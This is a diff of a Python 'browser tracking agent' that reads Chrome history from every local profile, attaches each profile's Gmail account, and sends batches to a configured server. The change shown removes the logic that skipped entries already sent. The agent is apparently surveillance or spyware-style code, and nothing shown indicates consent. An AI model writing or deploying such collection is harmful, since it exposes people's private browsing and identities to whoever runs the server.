@@ -39,16 +39,12 @@ class BrowserTrackingAgent:
         self.running = False
         self.monitor_thread = None
         self.status_file = os.path.join(os.path.dirname(__file__), 'agent_status.json')
-        self.sent_data_file = os.path.join(os.path.dirname(__file__), 'sent_data.json')
-
-        # Load previously sent data hashes
-        self.sent_data_hashes = self.load_sent_data()
-
+        
         # Setup signal handlers for graceful shutdown
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
-
-        print(f"[*] Browser Tracking Agent v1.1 (Fresh Data Only)")
+        
+        print(f"[*] Browser Tracking Agent v1.0")
         print(f"[*] Server: {self.config['server_url']}")
         print(f"[*] Interval: {self.config['check_interval']} seconds")
     
@@ -91,41 +87,6 @@ class BrowserTrackingAgent:
             return {'status': 'stopped'}
         except:
             return {'status': 'unknown'}
-
-    def load_sent_data(self):
-        """Load previously sent data hashes"""
-        try:
-            if os.path.exists(self.sent_data_file):
-                with open(self.sent_data_file, 'r') as f:
-                    data = json.load(f)
-                    return set(data.get('hashes', []))
-            return set()
-        except Exception as e:
-            print(f"[WARNING_SIGN] Error loading sent data: {e}")
-            return set()
-
-    def save_sent_data(self):
-        """Save sent data hashes"""
-        try:
-            # Keep only last 1000 hashes to prevent file from growing too large
-            hashes_list = list(self.sent_data_hashes)[-1000:]
-            self.sent_data_hashes = set(hashes_list)
-
-            data = {
-                'hashes': hashes_list,
-                'last_updated': datetime.now().isoformat()
-            }
-            with open(self.sent_data_file, 'w') as f:
-                json.dump(data, f, indent=2)
-        except Exception as e:
-            print(f"[WARNING_SIGN] Error saving sent data: {e}")
-
-    def create_data_hash(self, entry):
-        """Create unique hash for data entry"""
-        import hashlib
-        # Create hash from URL + title + visit_time + profile
-        hash_string = f"{entry['url']}|{entry['title']}|{entry['visit_time']}|{entry['profile_name']}"
-        return hashlib.md5(hash_string.encode()).hexdigest()
     
     def signal_handler(self, signum, frame):
         """Handle shutdown signals"""
@@ -230,22 +191,16 @@ class BrowserTrackingAgent:
                         
                         # Get Gmail account for this profile
                         gmail_account = self.get_gmail_account(profile_path)
-
-                        entry = {
+                        
+                        all_history.append({
                             'url': url[:2000],  # Truncate long URLs
                             'title': (title or '')[:500],  # Truncate long titles
                             'visit_time': visit_time.isoformat(),
                             'browser_type': 'Chrome',
                             'profile_name': profile_name,
                             'gmail_account': gmail_account
-                        }
-
-                        # Check if this entry was already sent
-                        entry_hash = self.create_data_hash(entry)
-                        if entry_hash not in self.sent_data_hashes:
-                            all_history.append(entry)
-                            profile_entries += 1
-                        # else: skip duplicate data
+                        })
+                        profile_entries += 1
                     
                     conn.close()
                     os.unlink(temp_db)
@@ -256,7 +211,7 @@ class BrowserTrackingAgent:
                     print(f"[WARNING_SIGN] Error reading {profile_name}: {e}")
                     continue
             
-            print(f"[STATS] Fresh data: {len(all_history)} new entries from {profiles_found} profiles")
+            print(f"[STATS] Total: {len(all_history)} entries from {profiles_found} profiles")
 
             # Sort all entries by timestamp (newest first) to get truly fresh data
             all_history.sort(key=lambda x: x['visit_time'], reverse=True)
@@ -264,7 +219,7 @@ class BrowserTrackingAgent:
             batch_size = self.config.get('batch_size', 50)
             selected_entries = all_history[:batch_size]
 
-            print(f"[BATCH] Selected {len(selected_entries)} fresh entries for transmission")
+            print(f"[BATCH] Sending {len(selected_entries)} most recent entries")
             return selected_entries
             
         except Exception as e:
@@ -367,29 +322,21 @@ class BrowserTrackingAgent:
                 if not self.register_client():
                     return False
             
-            # Collect browsing history (only fresh data)
+            # Collect browsing history
             history = self.get_chrome_history(50)
             if not history:
                 print("[INFO] No new data to send")
                 return True
-
+            
             # Send browsing data
-            print(f"[SEND] Sending {len(history)} fresh entries...")
+            print(f"[SEND] Sending {len(history)} entries...")
             success, response = self.send_data('browsing-data', {
                 'client_id': self.client_id,
                 'browsing_data': history
             })
-
+            
             if success:
-                # Mark data as sent
-                for entry in history:
-                    entry_hash = self.create_data_hash(entry)
-                    self.sent_data_hashes.add(entry_hash)
-
-                # Save sent data hashes
-                self.save_sent_data()
-
-                print(f"[OK] {len(history)} fresh entries sent successfully")
+                print(f"[OK] Data sent successfully")
                 return True
             else:
                 print(f"[ERROR] Failed to send data")
